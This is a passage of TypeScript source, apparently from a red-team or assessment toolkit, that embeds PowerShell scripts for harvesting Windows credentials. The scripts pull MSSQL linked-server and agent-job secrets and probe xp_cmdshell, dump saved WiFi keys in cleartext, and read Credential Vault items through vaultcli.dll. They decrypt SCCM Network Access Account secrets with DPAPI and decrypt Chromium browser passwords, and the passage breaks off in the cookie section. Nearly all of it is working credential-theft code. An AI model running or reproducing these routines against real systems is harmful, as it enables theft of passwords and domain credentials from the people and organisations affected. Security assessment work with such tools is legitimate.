  if (!server) return { output: "[!] Required: --server HOST", findings }

  output.push(`[*] MSSQL credential extraction — ${server}\n`)

  const authStr =
    user && password
      ? `$conn.ConnectionString = 'Server=${server};User Id=${user};Password=${password};TrustServerCertificate=True'`
      : `$conn.ConnectionString = 'Server=${server};Integrated Security=True;TrustServerCertificate=True'`

  const script = `
$conn = New-Object System.Data.SqlClient.SqlConnection
${authStr}
try {
    $conn.Open()
    Write-Output "[+] Connected to ${server}"
    Write-Output "    Version: $($conn.ServerVersion)"
} catch {
    Write-Output "[!] Connection failed: $_"
    exit 1
}

function Invoke-Sql {
    param([string]$Query)
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query, $conn)
    $cmd.CommandTimeout = 30
    $adapter = New-Object System.Data.SqlClient.SqlDataAdapter($cmd)
    $table = New-Object System.Data.DataTable
    try { $adapter.Fill($table) | Out-Null; return $table }
    catch { return $null }
}

# 1. Server info
Write-Output ""
Write-Output "[*] Server information:"
$info = Invoke-Sql "SELECT @@SERVERNAME AS [Server], SYSTEM_USER AS [Login], SUSER_SNAME() AS [User], IS_SRVROLEMEMBER('sysadmin') AS [IsSysAdmin]"
if ($info) {
    foreach ($row in $info.Rows) {
        Write-Output "    Server: $($row.Server)"
        Write-Output "    Login: $($row.Login)"
        Write-Output "    User: $($row.User)"
        Write-Output "    SysAdmin: $($row.IsSysAdmin)"
    }
}

# 2. Linked servers
Write-Output ""
Write-Output "[*] Linked servers:"
$linked = Invoke-Sql "SELECT srvname, srvproduct, providername, datasource, catalog FROM master.sys.sysservers WHERE srvid > 0"
if ($linked -and $linked.Rows.Count -gt 0) {
    foreach ($row in $linked.Rows) {
        Write-Output "    $($row.srvname) — $($row.providername) ($($row.datasource))"
    }
    # Try to get linked server credentials
    $linkedCreds = Invoke-Sql "SELECT s.name AS [LinkedServer], ll.remote_name AS [RemoteLogin] FROM sys.servers s JOIN sys.linked_logins ll ON s.server_id = ll.server_id WHERE s.is_linked = 1 AND ll.remote_name IS NOT NULL"
    if ($linkedCreds -and $linkedCreds.Rows.Count -gt 0) {
        Write-Output "    [!] Linked server credentials:"
        foreach ($row in $linkedCreds.Rows) {
            Write-Output "        $($row.LinkedServer) => $($row.RemoteLogin)"
        }
    }
    # Test openquery on linked servers
    foreach ($row in $linked.Rows) {
        $oq = Invoke-Sql "SELECT * FROM OPENQUERY([$($row.srvname)], 'SELECT SYSTEM_USER AS [user]')"
        if ($oq -and $oq.Rows.Count -gt 0) {
            Write-Output "    [+] Openquery on $($row.srvname): runs as $($oq.Rows[0].user)"
        }
    }
} else {
    Write-Output "    None found"
}

# 3. SQL Agent jobs with credentials
Write-Output ""
Write-Output "[*] SQL Agent jobs:"
$jobs = Invoke-Sql "SELECT j.name, js.step_name, js.subsystem, js.command, c.name AS credential_name FROM msdb.dbo.sysjobs j JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id LEFT JOIN sys.credentials c ON js.credential_id = c.credential_id WHERE js.command IS NOT NULL"
if ($jobs -and $jobs.Rows.Count -gt 0) {
    foreach ($row in $jobs.Rows) {
        $cmd = $row.command -replace '\\r\\n',' '
        if ($cmd.Length -gt 200) { $cmd = $cmd.Substring(0, 200) + '...' }
        Write-Output "    $($row.name) / $($row.step_name) [$($row.subsystem)]"
        if ($cmd -match 'password|pwd|secret|key|token') {
            Write-Output "    [!] Potential cred: $cmd"
        }
        if ($row.credential_name) {
            Write-Output "    [!] Uses credential: $($row.credential_name)"
        }
    }
}

# 4. Credentials and proxies
Write-Output ""
Write-Output "[*] SQL Server credentials:"
$creds = Invoke-Sql "SELECT name, credential_identity, create_date FROM sys.credentials"
if ($creds -and $creds.Rows.Count -gt 0) {
    foreach ($row in $creds.Rows) {
        Write-Output "    $($row.name) => $($row.credential_identity) (created: $($row.create_date))"
    }
}

$proxies = Invoke-Sql "SELECT p.name AS proxy_name, c.name AS credential_name, c.credential_identity FROM msdb.dbo.sysproxies p JOIN sys.credentials c ON p.credential_id = c.credential_id"
if ($proxies -and $proxies.Rows.Count -gt 0) {
    Write-Output "    Agent proxies:"
    foreach ($row in $proxies.Rows) {
        Write-Output "        $($row.proxy_name) => $($row.credential_name) ($($row.credential_identity))"
    }
}

# 5. SSIS packages
Write-Output ""
Write-Output "[*] SSIS packages (msdb):"
$ssis = Invoke-Sql "SELECT name, description FROM msdb.dbo.sysssispackages"
if ($ssis -and $ssis.Rows.Count -gt 0) {
    Write-Output "    Found $($ssis.Rows.Count) SSIS package(s)"
    foreach ($row in $ssis.Rows) {
        Write-Output "    $($row.name)"
    }
}

# 6. Database connection strings in msdb
Write-Output ""
Write-Output "[*] Searching for connection strings..."
$connStrings = Invoke-Sql "SELECT js.step_name, js.command FROM msdb.dbo.sysjobsteps js WHERE js.command LIKE '%connection%string%' OR js.command LIKE '%Data Source%' OR js.command LIKE '%Server=%'"
if ($connStrings -and $connStrings.Rows.Count -gt 0) {
    foreach ($row in $connStrings.Rows) {
        Write-Output "    $($row.step_name): $($row.command.Substring(0, [Math]::Min(200, $row.command.Length)))"
    }
}

# 7. Check xp_cmdshell
Write-Output ""
$xp = Invoke-Sql "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = 'xp_cmdshell'"
if ($xp -and $xp.Rows[0].config_value -eq 1) {
    Write-Output "[!] xp_cmdshell is ENABLED"
    $whoami = Invoke-Sql "EXEC xp_cmdshell 'whoami'"
    if ($whoami) { Write-Output "    Running as: $($whoami.Rows[0][0])" }
} else {
    Write-Output "[-] xp_cmdshell is disabled"
    Write-Output "    Enable with: sp_configure 'xp_cmdshell', 1; RECONFIGURE (requires sysadmin)"
}

# 8. Impersonation possibilities
Write-Output ""
Write-Output "[*] Impersonation possibilities:"
$impersonate = Invoke-Sql "SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
if ($impersonate -and $impersonate.Rows.Count -gt 0) {
    foreach ($row in $impersonate.Rows) {
        Write-Output "    Can impersonate: $($row.name)"
    }
}

$conn.Close()
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (
    result.stdout.includes("credential") ||
    result.stdout.includes("Potential cred") ||
    result.stdout.includes("xp_cmdshell is ENABLED")
  ) {
    findings.push({
      checkId: "WIN-MSSQL-001",
      provider: "windows",
      severity: "critical",
      status: "EXTRACTED",
      resource: `mssql://${server}`,
      title: `MSSQL credentials/access extracted from ${server}`,
      details: "SQL Server credentials, linked servers, agent jobs with secrets, or xp_cmdshell access found",
      remediation: "Rotate SQL credentials, disable xp_cmdshell, audit linked server permissions",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function wifiDump(args: string[], timeout: number): Promise<HookResult> {
  const format = argVal(args, "--format") || "text"
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting saved WiFi profiles and passwords...\n"]

  const script = `
$profiles = netsh wlan show profiles 2>$null
if (-not $profiles) {
    Write-Output "[!] WiFi service not available"
    exit 1
}

$profileNames = ($profiles | Select-String 'All User Profile\\s+:\\s+(.+)$').Matches | ForEach-Object { $_.Groups[1].Value.Trim() }
Write-Output "[+] WiFi profiles found: $($profileNames.Count)"

$results = @()
foreach ($name in $profileNames) {
    $detail = netsh wlan show profile name="$name" key=clear 2>$null
    $auth = ($detail | Select-String 'Authentication\\s+:\\s+(.+)$').Matches[0].Groups[1].Value.Trim()
    $cipher = ($detail | Select-String 'Cipher\\s+:\\s+(.+)$').Matches[0].Groups[1].Value.Trim()
    $keyContent = ($detail | Select-String 'Key Content\\s+:\\s+(.+)$').Matches
    $password = if ($keyContent) { $keyContent[0].Groups[1].Value.Trim() } else { "(none/enterprise)" }

    $isEnterprise = $auth -match 'WPA2-Enterprise|WPA3-Enterprise|802\\.1X'

    $entry = [PSCustomObject]@{
        SSID = $name
        Auth = $auth
        Cipher = $cipher
        Password = $password
        Enterprise = $isEnterprise
    }
    $results += $entry

    if ('${format}' -eq 'text') {
        Write-Output ""
        Write-Output "  SSID: $name"
        Write-Output "    Auth: $auth | Cipher: $cipher"
        if ($password -and $password -ne "(none/enterprise)") {
            Write-Output "    [!] Password: $password"
        }
        if ($isEnterprise) {
            Write-Output "    [Enterprise] Checking EAP settings..."
            # Export profile XML for enterprise details
            $tempXml = "$env:TEMP\\cs-wifi-$($name -replace '[^a-zA-Z0-9]','_').xml"
            netsh wlan export profile name="$name" folder="$env:TEMP" key=clear 2>$null | Out-Null
            $xmlFiles = Get-ChildItem "$env:TEMP\\*$($name -replace '[^a-zA-Z0-9]','*')*.xml" -ErrorAction SilentlyContinue
            foreach ($xml in $xmlFiles) {
                [xml]$wifiXml = Get-Content $xml.FullName
                $eapType = $wifiXml.WLANProfile.MSM.security.OneX.EAPConfig
                if ($eapType) {
                    Write-Output "    EAP Config present — check $($xml.FullName)"
                }
                # Check for stored credentials in profile
                $oneX = $wifiXml.WLANProfile.MSM.security.OneX
                if ($oneX.authMode -eq 'user' -or $oneX.authMode -eq 'machineOrUser') {
                    Write-Output "    Auth mode: $($oneX.authMode) — may have cached domain creds"
                }
            }
        }
    }
}

if ('${format}' -eq 'json') {
    $results | ConvertTo-Json -Depth 3
}

Write-Output ""
$withPwd = ($results | Where-Object { $_.Password -and $_.Password -ne "(none/enterprise)" }).Count
$enterprise = ($results | Where-Object { $_.Enterprise }).Count
Write-Output "[+] Summary: $($results.Count) profiles, $withPwd with cleartext passwords, $enterprise enterprise"
`
  const result = await ps(script, timeout)
  output.push(result.stdout)

  const pwdCount = (result.stdout.match(/Password:/g) || []).length
  if (pwdCount > 0) {
    findings.push({
      checkId: "WIN-WIFI-001",
      provider: "windows",
      severity: "high",
      status: "EXTRACTED",
      resource: "wifi://profiles",
      title: `WiFi passwords extracted: ${pwdCount} profiles with cleartext keys`,
      details: "Saved WiFi passwords recovered — may provide network access or reveal password patterns",
      remediation: "Use enterprise WiFi (802.1X) instead of PSK, rotate WiFi passwords",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function vaultDump(args: string[], timeout: number): Promise<HookResult> {
  const type = argVal(args, "--type") || "all"
  const findings: Finding[] = []
  const output: string[] = ["[*] Deep extraction from Windows Credential Vault...\n"]

  const script = `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class VaultCli {
    [DllImport("vaultcli.dll", EntryPoint = "VaultEnumerateVaults")]
    public static extern int VaultEnumerateVaults(int flags, out int vaultCount, out IntPtr vaultGuids);

    [DllImport("vaultcli.dll", EntryPoint = "VaultOpenVault")]
    public static extern int VaultOpenVault(ref Guid vaultGuid, uint flags, out IntPtr vaultHandle);

    [DllImport("vaultcli.dll", EntryPoint = "VaultEnumerateItems")]
    public static extern int VaultEnumerateItems(IntPtr vaultHandle, int flags, out int itemCount, out IntPtr items);

    [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem8")]
    public static extern int VaultGetItem8(IntPtr vaultHandle, ref Guid schemaId,
        IntPtr resource, IntPtr identity, IntPtr packageSid, IntPtr hwnd, int flags, out IntPtr item);

    [DllImport("vaultcli.dll", EntryPoint = "VaultFree")]
    public static extern int VaultFree(IntPtr vaultHandle);

    [DllImport("vaultcli.dll", EntryPoint = "VaultCloseVault")]
    public static extern int VaultCloseVault(ref IntPtr vaultHandle);

    // VAULT_ITEM structure fields at known offsets
    public static string ReadVaultItemString(IntPtr basePtr, int offset) {
        try {
            IntPtr strPtr = Marshal.ReadIntPtr(basePtr, offset);
            if (strPtr == IntPtr.Zero) return null;
            // Element type at strPtr+0, then data at strPtr+8
            int elemType = Marshal.ReadInt32(strPtr);
            if (elemType == 1) { // String type
                IntPtr dataPtr = Marshal.ReadIntPtr(strPtr, 8);
                if (dataPtr != IntPtr.Zero) return Marshal.PtrToStringUni(dataPtr);
            }
        } catch {}
        return null;
    }
}
"@

# Known vault GUIDs
$WebCredVault = [Guid]"4BF4C442-9B8A-41A0-B380-DD4A704DDB28"
$WinCredVault = [Guid]"77BC582B-F0A6-4E15-4E80-61736B6F3B29"

$vaultCount = 0
$vaultGuids = [IntPtr]::Zero
$hr = [VaultCli]::VaultEnumerateVaults(0, [ref]$vaultCount, [ref]$vaultGuids)

if ($hr -ne 0) {
    Write-Output "[!] VaultEnumerateVaults failed: 0x$($hr.ToString('X8'))"
    exit 1
}

Write-Output "[+] Vaults found: $vaultCount"

$filterType = '${type}'
$totalCreds = 0

for ($i = 0; $i -lt $vaultCount; $i++) {
    $guidPtr = [IntPtr]::new($vaultGuids.ToInt64() + ($i * 16))
    $vaultGuid = [Runtime.InteropServices.Marshal]::PtrToStructure($guidPtr, [Guid])

    $vaultType = "unknown"
    if ($vaultGuid -eq $WebCredVault) { $vaultType = "web" }
    elseif ($vaultGuid -eq $WinCredVault) { $vaultType = "windows" }

    if ($filterType -ne 'all' -and $vaultType -ne $filterType -and $vaultType -ne 'unknown') { continue }

    $vaultHandle = [IntPtr]::Zero
    $hr = [VaultCli]::VaultOpenVault([ref]$vaultGuid, 0, [ref]$vaultHandle)
    if ($hr -ne 0) { continue }

    Write-Output ""
    Write-Output "[+] Vault: $vaultGuid ($vaultType)"

    $itemCount = 0
    $items = [IntPtr]::Zero
    $hr = [VaultCli]::VaultEnumerateItems($vaultHandle, 512, [ref]$itemCount, [ref]$items)
    if ($hr -ne 0) {
        [VaultCli]::VaultCloseVault([ref]$vaultHandle) | Out-Null
        continue
    }

    Write-Output "    Items: $itemCount"

    # Each VAULT_ITEM is roughly 72 bytes (varies by arch)
    $itemSize = if ([IntPtr]::Size -eq 8) { 72 } else { 56 }
    for ($j = 0; $j -lt $itemCount; $j++) {
        $itemPtr = [IntPtr]::new($items.ToInt64() + ($j * $itemSize))

        # Read schema GUID at offset 0
        $schemaId = [Runtime.InteropServices.Marshal]::PtrToStructure($itemPtr, [Guid])

        # Read resource string (offset 16 on x64)
        $resource = [VaultCli]::ReadVaultItemString($itemPtr, 16)
        # Read identity string (offset 24 on x64)
        $identity = [VaultCli]::ReadVaultItemString($itemPtr, 24)

        # Try to get the full item with credential
        $fullItem = [IntPtr]::Zero
        $hr2 = [VaultCli]::VaultGetItem8($vaultHandle, [ref]$schemaId,
            [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, 0, [ref]$fullItem)

        $credential = ""
        if ($hr2 -eq 0 -and $fullItem -ne [IntPtr]::Zero) {
            # Credential is at offset 32 or 36
            $credential = [VaultCli]::ReadVaultItemString($fullItem, 32)
            if (-not $credential) {
                $credential = [VaultCli]::ReadVaultItemString($fullItem, 36)
            }
            [VaultCli]::VaultFree($fullItem) | Out-Null
        }

        if ($resource -or $identity) {
            $totalCreds++
            Write-Output ""
            Write-Output "    [$($j+1)] Resource: $resource"
            Write-Output "        Identity: $identity"
            if ($credential) {
                Write-Output "        [!] Credential: $credential"
            }
        }
    }

    [VaultCli]::VaultCloseVault([ref]$vaultHandle) | Out-Null
}

# Also dump cmdkey stored credentials
Write-Output ""
Write-Output "[*] cmdkey stored credentials:"
$cmdkey = cmdkey /list 2>$null
if ($cmdkey) {
    $cmdkey | ForEach-Object {
        if ($_ -match 'Target:|User:|Type:') { Write-Output "    $_" }
    }
}

# Check for RDP saved connections in registry
Write-Output ""
Write-Output "[*] RDP saved connections:"
$rdpServers = Get-ChildItem "HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers" -ErrorAction SilentlyContinue
if ($rdpServers) {
    foreach ($server in $rdpServers) {
        $name = Split-Path $server.Name -Leaf
        $hint = (Get-ItemProperty $server.PSPath -Name UsernameHint -ErrorAction SilentlyContinue).UsernameHint
        Write-Output "    $name => $hint"
    }
}

Write-Output ""
Write-Output "[+] Total credentials found: $totalCreds"
`
  const result = await ps(script, timeout)
  output.push(result.stdout)

  if (result.stdout.includes("Credential:") || result.stdout.includes("Total credentials found:")) {
    const countMatch = result.stdout.match(/Total credentials found: (\d+)/)
    const count = countMatch ? parseInt(countMatch[1]) : 0
    if (count > 0) {
      findings.push({
        checkId: "WIN-VAULT-001",
        provider: "windows",
        severity: "high",
        status: "EXTRACTED",
        resource: "vault://windows",
        title: `Windows Credential Vault: ${count} credentials extracted`,
        details: "Web credentials, Windows credentials, and RDP saved passwords extracted via VaultCli",
        remediation: "Clear stored credentials, use a credential manager with MFA, disable credential caching",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function sccmAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "naa"
  const findings: Finding[] = []
  const output: string[] = [`[*] SCCM/MECM exploitation — action: ${action}\n`]

  if (action === "naa") {
    const script = `
# Extract Network Access Account (NAA) credentials
Write-Output "[*] Extracting SCCM Network Access Account..."

# Method 1: WMI CIM
try {
    $naa = Get-WmiObject -Namespace "root\\ccm\\policy\\Machine\\ActualConfig" -Class "CCM_NetworkAccessAccount" -ErrorAction Stop
    if ($naa) {
        foreach ($account in $naa) {
            Write-Output "[+] NAA found:"
            # NetworkAccessUsername and NetworkAccessPassword are obfuscated
            $username = $account.NetworkAccessUsername
            $password = $account.NetworkAccessPassword
            Write-Output "    Username (obfuscated): $username"
            Write-Output "    Password (obfuscated): $password"

            # Try to deobfuscate using DPAPI
            # The values are in format: <PolicySecret Version="1"><![CDATA[...]]></PolicySecret>
            if ($username -match 'CDATA\\[(.+?)\\]') {
                $encUser = $Matches[1]
                Write-Output "    Encrypted username blob: $($encUser.Substring(0, [Math]::Min(40, $encUser.Length)))..."
            }
            if ($password -match 'CDATA\\[(.+?)\\]') {
                $encPass = $Matches[1]
                Write-Output "    Encrypted password blob: $($encPass.Substring(0, [Math]::Min(40, $encPass.Length)))..."
            }

            # Try DPAPI decryption
            try {
                Add-Type -AssemblyName System.Security
                if ($encUser) {
                    $bytes = [Convert]::FromBase64String($encUser)
                    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
                    $clearUser = [Text.Encoding]::Unicode.GetString($decrypted)
                    Write-Output "    [!] Decrypted username: $clearUser"
                }
                if ($encPass) {
                    $bytes = [Convert]::FromBase64String($encPass)
                    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
                    $clearPass = [Text.Encoding]::Unicode.GetString($decrypted)
                    Write-Output "    [!] Decrypted password: $clearPass"
                }
            } catch {
                Write-Output "    [!] DPAPI decrypt failed (need SYSTEM): $_"
                Write-Output "    Use: SharpSCCM.exe local secrets -m wmi"
            }
        }
    } else {
        Write-Output "[-] No NAA configured via WMI"
    }
} catch {
    Write-Output "[!] SCCM client not installed or WMI access denied: $_"
}

# Method 2: Check task sequences for embedded credentials
Write-Output ""
Write-Output "[*] Checking for cached task sequence policies..."
try {
    $ts = Get-WmiObject -Namespace "root\\ccm\\policy\\Machine\\ActualConfig" -Class "CCM_TaskSequence" -ErrorAction Stop
    if ($ts) {
        Write-Output "[+] Task sequences found: $($ts.Count)"
        foreach ($t in $ts) {
            Write-Output "    $($t.Name) — $($t.Description)"
        }
    }
} catch {}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stdout.includes("Decrypted") || result.stdout.includes("NAA found")) {
      findings.push({
        checkId: "WIN-SCCM-001",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: "sccm://naa",
        title: "SCCM Network Access Account credentials extracted",
        details: "NAA credentials recovered — typically a domain account used for network access during OSD",
        remediation: "Remove NAA configuration, use Enhanced HTTP or CMG instead",
      })
    }
  }

  if (action === "pxe") {
    const script = `
Write-Output "[*] Checking PXE boot configuration..."

# Check for PXE media variables
try {
    $pxeVars = Get-WmiObject -Namespace "root\\ccm\\policy\\Machine\\ActualConfig" -Class "CCM_Policy" -ErrorAction Stop |
        Where-Object { $_.PolicyID -match 'PXE|Boot' }
    if ($pxeVars) {
        Write-Output "[+] PXE-related policies: $($pxeVars.Count)"
        foreach ($p in $pxeVars) {
            Write-Output "    $($p.PolicyID)"
        }
    }
} catch {}

# Check for media PFX password in variables
try {
    $tsVars = Get-WmiObject -Namespace "root\\ccm\\policy\\Machine\\ActualConfig" -Class "CCM_CollectionVariable" -ErrorAction Stop
    if ($tsVars) {
        Write-Output "[+] Collection variables: $($tsVars.Count)"
        foreach ($v in $tsVars) {
            Write-Output "    $($v.Name) = $($v.Value)"
            if ($v.Name -match 'password|secret|key|token') {
                Write-Output "    [!] Potential secret: $($v.Name)"
            }
        }
    }
} catch {}

# Check TFTP for PXE boot images
Write-Output ""
Write-Output "[*] Checking for PXE/TFTP config..."
$dpInfo = Get-WmiObject -Namespace "root\\ccm" -Class "SMS_Authority" -ErrorAction SilentlyContinue
if ($dpInfo) {
    Write-Output "[+] SCCM Authority: $($dpInfo.Name)"
    Write-Output "    Current MP: $($dpInfo.CurrentManagementPoint)"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
  }

  if (action === "taskseq") {
    const script = `
Write-Output "[*] Extracting task sequence variables and secrets..."

# Get all task sequence policies
try {
    $policies = Get-WmiObject -Namespace "root\\ccm\\policy\\Machine\\ActualConfig" -Class "CCM_TaskSequence" -ErrorAction Stop
    if ($policies) {
        foreach ($p in $policies) {
            Write-Output "[+] Task Sequence: $($p.Name)"
            Write-Output "    Sequence: $($p.Sequence.Substring(0, [Math]::Min(500, $p.Sequence.Length)))..."

            # Look for embedded credentials in the XML
            if ($p.Sequence -match 'OSDDomainOUName|OSDJoinAccount|OSDJoinPassword|OSDNetworkJoinType') {
                Write-Output "    [!] Domain join credentials may be embedded"
            }
            if ($p.Sequence -match 'SMSTSRunCommandLineUserName|SMSTSRunCommandLineUserPassword') {
                Write-Output "    [!] Run Command Line credentials embedded"
            }
        }
    }
} catch {
    Write-Output "[!] Cannot access task sequences: $_"
}

# Check for OSD variables
try {
    $osdVars = Get-WmiObject -Namespace "root\\ccm\\policy\\Machine\\ActualConfig" -Class "CCM_SoftwareDistribution" -ErrorAction Stop
    Write-Output ""
    Write-Output "[+] Software distribution policies: $(($osdVars | Measure-Object).Count)"
} catch {}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stdout.includes("credentials")) {
      findings.push({
        checkId: "WIN-SCCM-002",
        provider: "windows",
        severity: "high",
        status: "EXTRACTED",
        resource: "sccm://tasksequence",
        title: "SCCM task sequence credentials found",
        details: "Domain join or run-command credentials embedded in task sequence policies",
        remediation: "Use collection variables with masking instead of embedding credentials in task sequences",
      })
    }
  }

  if (action === "collections") {
    const script = `
Write-Output "[*] Extracting SCCM collection variables..."
try {
    $vars = Get-WmiObject -Namespace "root\\ccm\\policy\\Machine\\ActualConfig" -Class "CCM_CollectionVariable" -ErrorAction Stop
    if ($vars) {
        Write-Output "[+] Collection variables: $(($vars | Measure-Object).Count)"
        foreach ($v in $vars) {
            $isMasked = $v.IsMasked
            Write-Output "    $($v.Name) = $($v.Value) $(if($isMasked){'[MASKED]'})"
        }
    } else {
        Write-Output "[-] No collection variables found"
    }
} catch {
    Write-Output "[!] Cannot access collection variables: $_"
}

# Also check device collection membership
try {
    $membership = Get-WmiObject -Namespace "root\\ccm" -Class "SMS_LookupMP" -ErrorAction Stop
    if ($membership) {
        Write-Output ""
        Write-Output "[+] Management Point info:"
        foreach ($mp in $membership) {
            Write-Output "    $($mp.Name) — $($mp.Value)"
        }
    }
} catch {}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
  }

  if (action === "policy") {
    const script = `
Write-Output "[*] Dumping SCCM local policy secrets..."

# All policy namespaces
$namespaces = @(
    "root\\ccm\\policy\\Machine\\ActualConfig",
    "root\\ccm\\policy\\Machine\\RequestedConfig"
)

foreach ($ns in $namespaces) {
    Write-Output ""
    Write-Output "[*] Namespace: $ns"
    try {
        $classes = Get-WmiObject -Namespace $ns -List -ErrorAction Stop | Where-Object { $_.Name -match 'CCM_' }
        Write-Output "    Classes: $($classes.Count)"

        # Check interesting classes for secrets
        $secretClasses = @('CCM_NetworkAccessAccount', 'CCM_CollectionVariable', 'CCM_TaskSequence', 'CCM_SoftwareDistribution')
        foreach ($cls in $secretClasses) {
            try {
                $objs = Get-WmiObject -Namespace $ns -Class $cls -ErrorAction Stop
                if ($objs) {
                    $count = ($objs | Measure-Object).Count
                    Write-Output "    [+] $cls : $count object(s)"
                }
            } catch {}
        }
    } catch {
        Write-Output "    [!] Access denied: $_"
    }
}

# Check CcmExec service info
Write-Output ""
$svc = Get-Service CcmExec -ErrorAction SilentlyContinue
if ($svc) {
    Write-Output "[+] SCCM Client service: $($svc.Status)"
    $ccmSetup = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\CCMSetup" -ErrorAction SilentlyContinue
    if ($ccmSetup) {
        Write-Output "    Base URL: $($ccmSetup.BaseUrl)"
        Write-Output "    Last update check: $($ccmSetup.LastUpdateCheck)"
    }
} else {
    Write-Output "[-] SCCM client not installed"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function browserHarvest(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "all"
  const browser = argVal(args, "--browser") || "all"
  const findings: Finding[] = []
  const output: string[] = ["[*] Browser credential harvesting...\n"]

  const script = `
Add-Type -AssemblyName System.Security

$browsers = @{
    'Chrome' = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data"
    'Edge' = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"
    'Brave' = "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data"
}

$targetBrowser = '${browser}'

function Decrypt-ChromiumPassword($encryptedData, $masterKey) {
    if ($encryptedData.Length -lt 15) { return '' }
    $header = [System.Text.Encoding]::UTF8.GetString($encryptedData[0..2])
    if ($header -eq 'v10' -or $header -eq 'v11') {
        $nonce = $encryptedData[3..14]
        $ciphertext = $encryptedData[15..($encryptedData.Length-17)]
        $tag = $encryptedData[($encryptedData.Length-16)..($encryptedData.Length-1)]
        try {
            $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
            $plaintext = New-Object byte[] $ciphertext.Length
            $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
            return [System.Text.Encoding]::UTF8.GetString($plaintext)
        } catch {
            return '[AES-GCM decrypt failed]'
        }
    } else {
        try {
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $null, 'CurrentUser')
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        } catch {
            return '[DPAPI decrypt failed]'
        }
    }
}

function Get-ChromiumMasterKey($userDataPath) {
    $localStatePath = Join-Path $userDataPath "Local State"
    if (-not (Test-Path $localStatePath)) { return $null }
    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
    $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
    $keyWithoutDPAPI = $encryptedKey[5..($encryptedKey.Length-1)]
    try {
        return [System.Security.Cryptography.ProtectedData]::Unprotect($keyWithoutDPAPI, $null, 'CurrentUser')
    } catch {
        return $null
    }
}

foreach ($bName in $browsers.Keys) {
    if ($targetBrowser -ne 'all' -and $bName -ne $targetBrowser -and $bName.ToLower() -ne $targetBrowser) { continue }
    $userDataPath = $browsers[$bName]
    if (-not (Test-Path $userDataPath)) { continue }

    Write-Output "=== $bName ==="
    $masterKey = Get-ChromiumMasterKey $userDataPath

    $profiles = @('Default') + (Get-ChildItem $userDataPath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })

    foreach ($profile in $profiles) {
        $profilePath = Join-Path $userDataPath $profile
        if (-not (Test-Path $profilePath)) { continue }

        if ('${action}' -eq 'passwords' -or '${action}' -eq 'all') {
            $loginDb = Join-Path $profilePath "Login Data"
            if (Test-Path $loginDb) {
                $tempDb = "$env:TEMP\\cs-login-$(Get-Random).db"
                Copy-Item $loginDb $tempDb -Force -ErrorAction SilentlyContinue

                try {
                    Add-Type -Path "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
                } catch {}

                $connStr = "Data Source=$tempDb;Version=3;Read Only=True;"
                try {
                    $conn = New-Object System.Data.SQLite.SQLiteConnection($connStr)
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 0"
                    $reader = $cmd.ExecuteReader()

                    $credCount = 0
                    while ($reader.Read()) {
                        $url = $reader['origin_url']
                        $user = $reader['username_value']
                        $encPass = $reader['password_value']
                        $pass = if ($masterKey -and $encPass.Length -gt 0) {
                            Decrypt-ChromiumPassword ([byte[]]$encPass) $masterKey
                        } else { '[encrypted]' }
                        Write-Output "    [$profile] $url"
                        Write-Output "        User: $user | Pass: $pass"
                        $credCount++
                    }
                    $conn.Close()
                    Write-Output "[*] $bName/$profile: $credCount saved passwords"
                } catch {
                    Write-Output "[-] SQLite read failed — browser may be running. Try: taskkill /f /im $($bName.ToLower()).exe"
                }
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
        }

        if ('${action}' -eq 'cookies' -or '${action}' -eq 'all') {
            $cookieDb = Join-Path $profilePath "Network\\Cookies"
            if (-not (Test-Path $cookieDb)) { $cookieDb = Join-Path $profilePath "Cookies" }
            if (Test-Path $cookieDb) {
                $tempDb = "$env:TEMP\\cs-cookies-$(Get-Random).db"
                Copy-Item $cookieDb $tempDb -Force -ErrorAction SilentlyContinue
                try {
                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;Read Only=True;")
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT COUNT(*) as cnt FROM cookies"
                    $total = $cmd.ExecuteScalar()

